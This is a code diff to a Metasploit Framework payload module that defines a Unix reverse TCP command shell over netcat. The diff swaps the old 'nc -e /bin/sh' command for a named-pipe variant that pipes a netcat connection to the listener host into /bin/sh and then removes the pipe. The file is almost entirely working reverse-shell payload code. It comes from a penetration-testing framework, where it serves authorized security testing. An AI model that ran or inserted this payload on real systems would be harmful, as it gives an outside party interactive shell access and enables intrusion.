@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -14,24 +10,28 @@ require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module Metasploit4
 
 	include Msf::Payload::Single
 	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Reverse TCP (via netcat -e)',
-			'Version'       => '$Revision$',
+			'Name'          => 'Unix Command Shell, Reverse TCP (via netcat)',
 			'Description'   => 'Creates an interactive shell via netcat',
-			'Author'        => 'hdm',
+			'Author'         =>
+				[
+					'm-1-k-3',
+					'egypt',
+					'juan vazquez'
+				],
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
 			'Handler'       => Msf::Handler::ReverseTcp,
 			'Session'       => Msf::Sessions::CommandShell,
 			'PayloadType'   => 'cmd',
-			'RequiredCmd'   => 'netcat-e',
+			'RequiredCmd'   => 'netcat',
 			'Payload'       =>
 				{
 					'Offsets' => { },
@@ -51,7 +51,8 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		"nc #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh "
+		backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
+		"mknod /tmp/#{backpipe} p; nc #{datastore['LHOST']} #{datastore['LPORT']} 0</tmp/#{backpipe} | /bin/sh >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe} "
 	end
 
 end
